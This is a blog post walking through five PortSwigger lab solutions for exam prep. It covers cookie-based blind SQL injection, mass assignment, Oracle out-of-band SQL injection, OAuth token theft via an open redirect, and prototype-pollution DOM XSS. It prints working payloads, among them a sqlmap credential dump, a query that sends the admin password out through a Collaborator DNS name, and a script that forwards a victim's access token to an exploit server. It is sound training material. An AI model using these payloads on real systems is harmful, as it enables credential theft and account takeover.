---
layout: post
title: "Five Rolls Into Step Two: The Obvious Input Was Never the Point"
date: 2026-11-17
categories: [web-security, walkthrough]
tags: [portswigger, bscp, sql-injection, sqlmap, mass-assignment, oauth, prototype-pollution, dom-invader, mystery-lab, burp-suite]
excerpt: "Five more escalation rolls from my Mystery Pool, and the same lesson kept landing: I scanned the obvious parameter, it came back clean, and the real bug was one line up in a cookie, a field only the GET revealed, or a 400 that told me which lab I was in."
lang: en
page_id: five-rolls-into-step-two
permalink: /posts/five-rolls-into-step-two/
---

I scanned the `category` parameter because it was the obvious one — a filter taking user input straight into something that smelled like a SQL query. It came back clean. Not clean as in safe; clean as in the scanner found nothing, because I'd aimed it at the wrong byte. The injection was one line up, in the `TrackingId` cookie — a field I'd nearly skipped because nothing in the UI invites you to touch it. That gap, between the input the page hands you and the input the server actually trusts, turned out to be the whole of step two.

The [last post]({% post_url 2026-11-16-csrf-token-tied-to-non-session-cookie %}) was the first roll of the second BSCP step — privilege escalation — from my own [Mystery Pool]({% post_url 2026-10-04-mystery-pool %}). I kept spinning. Five more rolls, five different vulnerabilities, and by the third I'd stopped treating the pattern as a coincidence: in every one of them, the obvious input was a decoy, and the bug lived wherever the server *said* more than the UI let me say.

## The setup

Same tool, Escalation card ticked, Practitioner level. One thing worth naming because it recurs below: several of these came up as **direct topics** — the categories the Mystery Lab doesn't cover, which my tool pulls straight from the all-labs page and opens by their real launch URL. The trade-off I built into it is that a direct lab shows its **title** the moment it loads, so the surprise ends early. Three of these five rolls spoiled their own topic that way. It's a fair price — I'd rather roll broadly across step two than keep every title hidden — but it's honest to say the wheel sometimes tells you what you're about to fight.

Tooling: Burp with the scanner pointed at individual inputs (never a broad crawl), Repeater, sqlmap for the blind SQLi, DOM Invader for the prototype pollution, Collaborator for the out-of-band work.

## The session

### Roll 1 — Blind SQL injection, and the cookie I almost skipped

The home page had a `GET /filter?category=...`. Obvious injectable, so I scanned `category`. Nothing. The thing that stopped me re-rolling was a habit: scan *every* input on the request, cookies included. So I scanned `TrackingId` too, and that's where the high-severity finding landed — **SQL injection**, confirmed by Burp through *response diffing*:

```
TrackingId=0Ql8js2ZepUEwhwl' or '8625'='8625
```

That payload doesn't extract anything, open a UNION, or sleep — it just makes a condition **true** and watches whether the page reacts. The page did: a *"Welcome back"* message appeared on true and vanished on false. That's a **boolean-based blind** SQLi — the data never shows in the response, but the response *shape* answers yes/no. How you tell it apart from the other families, fast:

| Technique | The tell |
|---|---|
| **B — boolean blind** | response **changes** true vs false, data not shown |
| U — UNION | data appears **in the page** |
| E — error-based | the DB **error** carries the data |
| T — time blind | response never changes, only the **delay** does |

Because the oracle was that clean, I reached for sqlmap. The trick with a cookie injection is to mark the point with `*` so it doesn't waste time fuzzing `category`:

```bash
sqlmap -u "https://YOUR-LAB-ID.web-security-academy.net/filter?category=Accessories" \
  --cookie="TrackingId=0Ql8js2ZepUEwhwl*; session=YOUR-SESSION" \
  --batch --dbms=postgresql --technique=B --string="Welcome back" \
  -D public -T users -C username,password --dump --threads=10
```

`--technique=B` because I already *knew* it was boolean (forcing it skips the noisy time-based probes), and `--string="Welcome back"` is the whole game: it's literally "automate the thing I'd check by hand." The dump came back first try:

```
administrator | 0bka427y63nnqd439068
carlos        | hv6602gbsv4u6q3j5omh
wiener        | w8078twwa6rdgo2gejfb
```

Log in as administrator, done. **The lesson isn't the SQLi, it's where it lived**: cookies are insertion points, and the scanner only finds what you point it at.

### Roll 2 — Mass assignment, or the field only the GET admitted to

A direct topic (API testing), title spoiled on load: mass assignment. The checkout flow had both a **GET and a POST** on `/api/checkout`. The POST the browser sends is short:

```json
{ "chosen_products":[{"product_id":"1","quantity":1}] }
```

But the **GET** on the same endpoint returns the full shape of the order object — including a field the form never sends:

```json
{ "chosen_discount": { "percentage": 0 }, "chosen_products":[...] }
```

That mismatch — the server *reads back* a field it never lets the UI *write* — is the entire vulnerability. The framework auto-binds incoming JSON onto the order object with no whitelist, so anything the object has, you can set. I copied `chosen_discount` into the POST and pushed it to the limit:

```json
{
"chosen_discount":{"percentage":100},
"chosen_products":[{"product_id":"1","quantity":1}]}
```

100% off, order placed, bought the jacket I couldn't afford. The identification step here is a diff: **compare the fields the API returns against the fields the UI submits; the extras are your candidates.** Guessing field names blind (`isAdmin`, `credit`) is the rabbit hole — the GET response hands you the real one for free. (Small tell for later: the POST went out as `Content-Type: text/plain`, a simple request dodging CORS preflight — the kind of looseness that says this API trusts input in more than one place.)

### Roll 3 — The same cookie, a different channel

Next roll looked like roll 1 wearing the same coat — `GET /filter?category=...`, a `TrackingId` cookie — and this time I scanned the cookie *first*, because roll 1 had taught me. SQL injection again, same sink. But the payload the scanner planted was a different animal entirely:

```sql
' || (select extractvalue(xmltype(
  '<?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://YOUR-ID.oastify.com/"> %remote;]>'
), '/l') from dual) || '
```

Three things to read off that. **It's Oracle** — `xmltype`, `extractvalue`, `from dual` are the fingerprint. **It's out-of-band** — the page response never changes at all, so there's no boolean oracle like roll 1; instead the payload makes the *database itself* open a connection to my Collaborator, via an XXE smuggled inside the SQL. And the hostname is **split with `'||'`** (`...oasti' || 'fy.com`) because the whole thing lives inside a SQL string and gets concatenated at runtime.

Put roll 1 and roll 3 side by side and the point writes itself: **identical sink, the same `TrackingId` cookie, but the detection channel is completely different.** Roll 1 talks back through the page (in-band boolean); roll 3 says nothing on screen and talks through DNS (out-of-band). The lab's goal was just the interaction — an entry in Collaborator's log solved it. But the exam-relevant upgrade is to move the data into the subdomain:

```sql
...<!ENTITY % r SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.YOUR-ID.oastify.com/">...
```

and read the admin's password off the DNS prefix. OAST is the channel you reach for when the page gives you *nothing* — you force the server to answer to *you* instead.

### Roll 4 — The 400 that told me which lab I was in

A direct topic again, OAuth. I noticed the login went through an OAuth provider, read the authorization request, and two things jumped out:

```
GET /auth?client_id=...&redirect_uri=https://LAB/oauth-callback
         &response_type=token&nonce=...&scope=openid profile email
```

`response_type=token` is the **implicit flow**: the provider hands back the access token directly, in the **URL fragment** of the `redirect_uri`. Which means whoever controls where that URL lands gets the token. So I pointed `redirect_uri` at my exploit server — and got stopped:

```
400  error: redirect_uri_mismatch
     redirect_uri did not match any of the client's registered redirect_uris
```

Here's the part I want to flag, because it nearly cost me: I almost grabbed the write-up for *"OAuth account hijacking via redirect_uri"* — a lab that looks identical — and followed it straight into a wall. That lab has a *lax* `redirect_uri` (point it anywhere, no error). Mine returned `redirect_uri_mismatch`. **The error is the discriminator**:

| | Account hijacking via redirect_uri | **Stealing tokens via open redirect (mine)** |
|---|---|---|
| `response_type` | `code` | **`token`** |
| `redirect_uri` validation | lax — anything accepted | **strict — `redirect_uri_mismatch`** |
| the way in | point it at your server | **chain an on-site open redirect** |

So the `400` wasn't a wall, it was a signpost: *you can't go direct, you need an open redirect on the allowed domain.* Two weaknesses combined to bypass the whitelist. First, the validation only checks the **prefix**, so a path traversal passes it:

```
redirect_uri=https://LAB/oauth-callback/../post?postId=1
```

starts with `/oauth-callback` (whitelist happy), and the browser normalises `/oauth-callback/../post` → `/post`. That got me onto the site, but still *on the lab's domain*, with the token stuck in a fragment I couldn't read. The second weakness was the **open redirect** in the blog's "next post" link — `/post/next?path=` took any external URL and bounced straight to it. Chain them:

```
redirect_uri=https://LAB/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER/exploit/
```

The piece that makes the whole thing work is a browser rule: **the fragment survives a redirect.** Follow a `302` to a location with no fragment of its own, and the browser re-attaches the original `#access_token=...`. So the token rides the open redirect all the way to my server. The exploit is two-phase, because the fragment never reaches a server on its own:

```html
<script>
  if (!document.location.hash) {
    // phase 1 — no token yet: send the victim into the OAuth flow
    window.location = 'https://oauth-SERVER/auth?client_id=CLIENT'
      + '&redirect_uri=https://LAB/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER/exploit/'
      + '&response_type=token&nonce=-394297768&scope=openid%20profile%20email';
  } else {
    // phase 2 — back here with #access_token: turn it into a query string and log it
    window.location = '/?' + document.location.hash.substr(1);
  }
</script>
```

Deliver to the victim (the admin, who keeps an active OAuth session), read their access token out of my access log, and spend it:

```http
GET /me HTTP/2
Host: LAB
Authorization: Bearer STOLEN-ADMIN-TOKEN
```

The response carried the admin's API key. Two rabbit holes to name: believing `redirect_uri_mismatch` is a dead end (it's the clue), and stopping at phase 1 — the fragment sits in the browser and never hits your log until phase 2 converts it to a query string.

### Roll 5 — Prototype pollution, and the honesty of an easy win

Last roll, another direct topic with its title in the open: *DOM XSS via client-side prototype pollution*. I'll be straight — this one was three clicks, and the honest part of the story is *why* it was three clicks.

DOM Invader, with prototype-pollution detection on, immediately flagged a **source**: `__proto__[property]=value in search`. In plain terms, the page parses the query string into an object in a way that lets `?__proto__[x]=y` write onto `Object.prototype` — the prototype every object inherits from. Poison it, and a property that was `undefined` everywhere is suddenly yours everywhere. That's only half an exploit, though; pollution does nothing until some code *reads* a poisoned property and feeds it to a sink. So: **Scan for gadgets**, and DOM Invader found one — a **sink `script.src`** reached through a gadget property called `transport_url`. Somewhere the page does roughly:

```js
if (config.transport_url) {
  const s = document.createElement('script');
  s.src = config.transport_url;   // sink
  document.body.appendChild(s);
}
```

`config.transport_url` is normally `undefined`, so nothing happens — until prototype pollution makes `config` inherit my value. The payload DOM Invader generated:

```
/?__proto__[transport_url]=data:,alert(document.cookie)
```

The query poisons `Object.prototype.transport_url`, `config.transport_url` inherits the `data:` URI, the page sets it as a script `src`, and the `data:` URI executes. Lab solved.

Here's the honest note the diary voice demands: **DOM Invader made it easy, and easy is not the same as understood.** The tool automated the whole chain — source, gadget, exploit — but on the exam, the moment the gadget isn't in its list, or the source is behind a custom merge, you're back to doing it by hand: confirm the source in the console (`?__proto__[x]=y`, then check `Object.prototype.x`), hunt the gadget in the JavaScript, build the payload. The thing to carry out isn't the click; it's *which property, read by which code, lands in which sink.*

## The pattern

Five rolls, one shape. In every single one, **the obvious input was a decoy, and the vulnerability lived where the server revealed more than the UI invited me to send:**

- a **cookie** that flowed into a SQL query, not the visible `category` parameter (rolls 1 and 3);
- a **field the GET returned** but the form never submitted (roll 2);
- a **database that answered through DNS** when the page said nothing (roll 3);
- a **provider that handed back a token in a fragment**, where a `400` pointed the way in (roll 4);
- a **query parameter that wrote onto `Object.prototype`**, surfacing a property no form exposes (roll 5).

And the method never changed: **read what the server gives back before you throw payloads at it.** The clean scan on `category`, the `chosen_discount` in the GET body, the scanner's own `extractvalue` payload, the `redirect_uri_mismatch` error, DOM Invader's source panel — each one *told* me where the real input was. Identification before exploitation. An error is information, not a wall.

The second thread is subtler: **the sink doesn't pick the technique; the surrounding reality does.** Rolls 1 and 3 were the identical SQLi in the identical cookie, and one was boolean-in-band while the other was out-of-band — the channel was dictated by whether the page answered, not by the injection. Roll 4's whole exploit turned on one browser rule about fragments. Roll 5's severity was decided by which gadget happened to exist. You identify the sink to know *where* you are; the exact context tells you *how* to leave.

## Exam and field

**In the exam**, all five are Stage 2 — privilege escalation, every one of them a different road to someone else's account. The recognition tells are concrete and worth over-rehearsing, because the clock is won on identification, not cleverness: scan *every* input including cookies (SQLi hides there); diff the API's read shape against its write shape (mass assignment); reach for OAST the moment an injection is confirmed but the page says nothing; read `response_type` and the `redirect_uri` error to tell the two OAuth labs apart *before* you pick an exploit; run DOM Invader with prototype-pollution on and let it find the source, then understand the gadget it hands you. Interaction profiles differ and the exam cares: the SQLi and mass assignment are **non-interactive** (you query the server yourself), while the OAuth theft and a weaponised prototype-pollution XSS are **interactive** — they need the admin to open your link, which is where step one's delivery tricks come back in.

**In the field**, the ranking is by blast radius. The blind SQLi exfiltrates the whole user table; mass assignment is a business-logic hole that scales to whatever sensitive field the object happens to hold (`isAdmin`, `balance`, `role`); the OAuth flaw hands over live sessions; and prototype pollution is the quiet structural one — a class of bug endemic to the JavaScript ecosystem, client-side gadgets leading to DOM XSS in third-party scripts, and server-side pollution escalating all the way to RCE, privilege bypass, or DoS in Node apps. The single discipline that would have closed most of them: never trust an input because the UI didn't offer it — cookies, extra JSON fields, `__proto__` keys and `redirect_uri` values are all attacker-controlled, and the server has to treat them that way before it reads a byte.

## What comes next

Step two is mostly answered now — six rolls across two posts, and the escalation phase has shown its hand: it's account takeover by whatever road the target leaves open. The open thread is server-side prototype pollution, the one variant my tool files under *exfiltration* rather than escalation, because its endgame is remote code execution rather than a stolen session — which is exactly the bridge into step three. The wheel's pointed there next.

## Takeaways

- The obvious input is usually the decoy: scan every input including **cookies**, and the real SQLi (or worse) is often one line up from the parameter you reached for first.
- Mass assignment is a diff: compare the fields the **API returns** against the fields the **UI submits** — the extras (`chosen_discount`, `isAdmin`) are your injection candidates; don't guess them blind.
- The sink doesn't pick the technique. Identical SQLi in the identical cookie was boolean-in-band in one lab and out-of-band in another — OAST is the channel you use when the page answers with nothing.
- `redirect_uri_mismatch` is a signpost, not a wall: it tells you you're in the *open-redirect* OAuth lab, not the lax-`redirect_uri` one — read `response_type` and the error before copying any write-up.
- DOM Invader makes client-side prototype pollution three clicks, but easy isn't understood: know the source → gadget → sink chain by hand, because the exam will hand you a gadget the tool doesn't list.

## Useful references

- [PortSwigger: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- [PortSwigger: Blind SQL injection with out-of-band interaction](https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band)
- [PortSwigger: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
- [PortSwigger: Stealing OAuth access tokens via an open redirect](https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect)
- [PortSwigger: DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/dom-xss)
- [PortSwigger: Client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [sqlmap](https://sqlmap.org/) · [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)
- [botesjuan — Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
- [Mystery Pool — the tool these rolls came from]({% post_url 2026-10-04-mystery-pool %})

*All techniques shown were performed on an isolated lab environment (PortSwigger's Web Security Academy). Running these attacks against systems you don't own or have written authorization to test is illegal in most jurisdictions.*
